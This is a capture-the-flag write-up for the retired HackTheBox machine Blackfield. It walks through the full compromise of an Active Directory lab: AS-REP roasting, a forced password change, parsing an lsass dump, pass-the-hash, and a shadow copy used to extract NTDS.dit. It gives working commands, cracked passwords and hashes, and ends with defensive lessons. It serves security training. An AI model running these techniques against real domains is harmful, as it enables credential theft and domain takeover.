# Blackfield — HackTheBox

| Field | Detail |
|---|---|
| OS | Windows |
| Difficulty | Hard |
| Active Directory | Yes |
| IP | 10.129.229.17 |
| Domain | BLACKFIELD.local |
| User flag | ✓ |
| Root flag | ✓ |
| Retired | Yes |
| Site writeup | [jostif.pages.dev/writeups/blackfield](https://jostif.pages.dev/writeups/blackfield) |

**Techniques:** Anonymous SMB → profiles$ username enum → AS-REP Roasting → BloodHound → ForceChangePassword → forensic share → lsass.DMP → pypykatz → svc_backup NT hash → SeBackupPrivilege → diskshadow + robocopy → NTDS.dit → Administrator PTH

---

---

## Attack Chain

```
Anonymous SMB → profiles$ username enum → AS-REP Roasting (support)
→ BloodHound → ForceChangePassword (audit2020) → forensic share
→ lsass.DMP → pypykatz → svc_backup NT hash → Evil-WinRM
→ SeBackupPrivilege → diskshadow + robocopy → NTDS.dit dump
→ Administrator hash → SYSTEM
```

---

## Overview

Blackfield is a Hard Windows Active Directory machine with a clean, realistic attack chain. It starts with anonymous SMB access that leaks hundreds of usernames. AS-REP roasting against those usernames cracks the `support` account. BloodHound reveals that `support` has `ForceChangePassword` over `audit2020`. Changing that password opens the `forensic` share, which contains an lsass memory dump. Parsing the dump with pypykatz gives us the NT hash for `svc_backup`. That account is a member of **Backup Operators**, which grants `SeBackupPrivilege` — allowing us to copy the locked NTDS.dit database via a shadow copy. Dumping NTDS.dit with the SYSTEM hive gives us the domain Administrator hash, completing the chain.

---

## 1. Recon

```bash
nmap -sC -sV -p- --min-rate 5000 -oN nmap_full.txt 10.129.229.17
```

### Key Open Ports

| Port | Service | Notes |
|------|---------|-------|
| 53 | DNS | Simple DNS Plus |
| 88 | Kerberos | AD domain confirmed |
| 389 | LDAP | Domain: BLACKFIELD.local |
| 445 | SMB | Signing required |
| 5985 | WinRM | Remote management |

### Environment Setup

```bash
export IP=10.129.229.17
export DOMAIN=BLACKFIELD.local
export LHOST=10.10.14.78
```

> **Note:** Nmap detected a 7-hour clock skew. This matters for Kerberos — fix it if you hit clock skew errors:
> ```bash
> sudo ntpdate -u $IP
> ```

---

## 2. SMB Enumeration

Null session is denied but the `guest` account works:

```bash
nxc smb $IP -u 'guest' -p '' --shares
```

```
profiles$   READ    (user profile folders)
forensic    (no read yet — needs credentials)
IPC$        READ
```

The `profiles$` share contains hundreds of empty user profile directories — but the directory names **are** valid AD usernames:

```bash
smbclient //$IP/profiles$ -N
smb: \> ls
```

Extract all usernames into a wordlist:

```bash
smbclient //$IP/profiles$ -N -c ls | awk '{print $1}' | grep -v '^\.' | grep -v '^$' > users.txt
```

Then add the interesting ones spotted manually: `audit2020`, `support`, `svc_backup`.

---

## 3. AS-REP Roasting

AS-REP roasting targets accounts with **Kerberos pre-authentication disabled**. When this setting is on, the KDC returns an encrypted TGT blob without verifying the requester's identity first — meaning we can request it unauthenticated and crack it offline.

```bash
impacket-GetNPUsers BLACKFIELD.local/ -dc-ip $IP -no-pass -usersfile users.txt
```

Result — `support` has pre-auth disabled and returns a crackable hash:

```
$krb5asrep$23$support@BLACKFIELD.LOCAL:934e6dd306...016d4f
```

Save to `asrep_hash.txt` and crack with hashcat:

```bash
hashcat -m 18200 asrep_hash.txt /usr/share/wordlists/rockyou.txt
```

```
support : #00^BlackKnight
```

Cracked in ~6 seconds.

---

## 4. BloodHound Enumeration

With valid credentials, run BloodHound to map the AD attack paths:

```bash
bloodhound-python -u support -p '#00^BlackKnight' \
  -d BLACKFIELD.local -ns $IP -c All --zip
```

Import the zip into BloodHound and search for `support`. The key finding:

> **support → ForceChangePassword → audit2020**

`ForceChangePassword` is an AD permission that allows changing another user's password **without knowing their current one**. This is the path to `audit2020`.

---

## 5. ForceChangePassword on audit2020

Use `rpcclient` to change the password directly over SMB/IPC$:

```bash
rpcclient -U "support%#00^BlackKnight" $IP \
  -c "setuserinfo2 audit2020 23 'Password123!'"
```

> The `23` is the Windows info level `USER_INFO_23` — used specifically for password changes via RPC.

Verify:

```bash
nxc smb $IP -u audit2020 -p 'Password123!' --shares
```

The `forensic` share now shows **READ** permission.

---

## 6. forensic Share — lsass Memory Dump

```bash
smbclient //$IP/forensic -U audit2020%'Password123!'
smb: \> cd memory_analysis
smb: \memory_analysis\> ls
```

The share contains process memory dumps. The critical one is `lsass.zip` — LSASS (Local Security Authority Subsystem Service) is the Windows process that handles authentication and **stores plaintext passwords and NT hashes in memory**.

Standard `smbclient get` times out on large files. Use impacket instead:

```bash
impacket-smbclient 'BLACKFIELD.local/audit2020:Password123!@'$IP
# use forensic
# cd memory_analysis
# get lsass.zip
```

Extract and parse:

```bash
unzip lsass.zip
pypykatz lsa minidump lsass.DMP 2>/dev/null | grep -A5 "svc_backup"
```

Output:

```
Username: svc_backup
NT: 9658d1d1dcd9250115e2205d9f48400d
```

---

## 7. Foothold — svc_backup via Pass-the-Hash

```bash
nxc winrm $IP -u svc_backup -H '9658d1d1dcd9250115e2205d9f48400d'
# [+] BLACKFIELD.local\svc_backup (Pwn3d!)

evil-winrm -i $IP -u svc_backup -H '9658d1d1dcd9250115e2205d9f48400d'
```

```powershell
type C:\Users\svc_backup\Desktop\user.txt
3920bb317a0bef51027e2852be64b543
```

**User flag:** `3920bb317a0bef51027e2852be64b543`

---

## 8. Privilege Escalation — Backup Operators → SYSTEM

### Why NTDS.dit and not SAM?

This is the most important concept in this privesc, so it deserves a full explanation.

**SAM (Security Account Manager)** stores hashes for **local accounts only** — the built-in Administrator, Guest, and any locally created users. On a Domain Controller, the real domain accounts (including the domain Administrator) are **not** stored in SAM. Trying to dump SAM on a DC gives you nothing useful for domain compromise.

**NTDS.dit** is the Active Directory database file stored at `C:\Windows\NTDS\ntds.dit`. It contains **every domain account's NT hash**, including the domain Administrator. This is the file we need.

The problem: NTDS.dit is locked by the AD DS service while the DC is running — you can't just copy it. And even with `SeBackupPrivilege`, you can't read it directly from `C:\Windows\NTDS\` while it's in use.

**The solution: Volume Shadow Copy (VSS)**

Windows VSS creates point-in-time snapshots of volumes. A shadow copy captures the filesystem state including locked files. We create a shadow copy of `C:\`, expose it as `Z:\`, then copy NTDS.dit from the snapshot where it's not locked.

### Step 1 — Check Privileges

```powershell
whoami /priv
```

`svc_backup` has `SeBackupPrivilege` enabled — this allows bypassing file ACLs for backup purposes, which is exactly what `robocopy /b` uses.

### Step 2 — Create diskshadow Script

On Kali:

```bash
cat > /tmp/shadow.dsh << 'EOF'
set context persistent nowriters
add volume c: alias blackfield
create
expose %blackfield% z:
EOF
unix2dos /tmp/shadow.dsh
```

> `unix2dos` converts Linux line endings (LF) to Windows (CRLF). diskshadow requires Windows line endings or it silently fails.

### Step 3 — Execute on Target

```powershell
mkdir C:\temp
cd C:\temp
upload /tmp/shadow.dsh shadow.dsh
diskshadow /s shadow.dsh
```

This creates a shadow copy of `C:\` and mounts it as `Z:\`.

### Step 4 — Copy NTDS.dit from Shadow Copy

```powershell
robocopy /b z:\windows\ntds C:\temp ntds.dit
```

The `/b` flag uses backup semantics — bypassing file ACL restrictions via `SeBackupPrivilege`.

### Step 5 — Save SYSTEM Hive

```powershell
reg save HKLM\SYSTEM C:\temp\system2.hive /y
```

> We need SYSTEM because it contains the **boot key** used to encrypt the NT hashes inside NTDS.dit. Without it, the hashes can't be decrypted.

### Step 6 — Download Both Files

```powershell
download ntds.dit
download system2.hive
```

### Step 7 — Extract Hashes on Kali

```bash
impacket-secretsdump -ntds ntds.dit -system system2.hive LOCAL
```

Output:

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
audit2020:1103:aad3b435b51404eeaad3b435b51404ee:600a406c2c1f2062eb9bb227bad654aa:::
support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::
svc_backup:1413:aad3b435b51404eeaad3b435b51404ee:9658d1d1dcd9250115e2205d9f48400d:::
```

### Step 8 — Pass-the-Hash as Administrator

```bash
evil-winrm -i $IP -u Administrator -H '184fb5e5178480be64824d4cd53b99ee'
```

```powershell
type C:\Users\Administrator\Desktop\root.txt
4375a629c7c67c8e29db269060c955cb
```

**Root flag:** `4375a629c7c67c8e29db269060c955cb`

---

## 9. Credentials Summary

| User | Credential | Method |
|------|-----------|--------|
| support | `#00^BlackKnight` | AS-REP roast + hashcat |
| audit2020 | `Password123!` | ForceChangePassword via rpcclient |
| svc_backup | `9658d1d1dcd9250115e2205d9f48400d` (NT) | pypykatz lsass dump |
| Administrator | `184fb5e5178480be64824d4cd53b99ee` (NT) | NTDS.dit secretsdump |

---

## 10. Lessons Learned

**profiles$ share leaks your entire user list.**
Anonymous or guest access to a profiles share exposes every AD username — perfect for AS-REP roasting and password spraying. Always restrict this share.

**Disable Kerberos pre-auth only when absolutely necessary.**
Accounts with pre-auth disabled leak crackable material to anyone on the network, no credentials required.

**ForceChangePassword is a dangerous ACL.**
It looks harmless in a permissions audit but gives complete account takeover without knowing the victim's password. BloodHound is essential for finding these hidden paths.

**LSASS memory dumps contain live credentials.**
Storing process dumps in a network share is catastrophic. LSASS holds NT hashes and sometimes plaintext passwords for every logged-in user.

**SAM vs NTDS.dit — know the difference.**
- **SAM** → local accounts only, not useful on a DC for domain compromise
- **NTDS.dit** → every domain account hash, the crown jewels of AD
- Both require the **SYSTEM hive** to decrypt, because hashes are encrypted with the boot key stored there

**SeBackupPrivilege = full filesystem read.**
Any account in Backup Operators can read any file on the system using backup semantics — including locked database files. This group should be treated as near-equivalent to Domain Admins.

**VSS shadow copies bypass file locks.**
Active files like NTDS.dit can't be copied directly. Creating a shadow copy captures a consistent snapshot where the file is not locked, enabling extraction via robocopy /b.
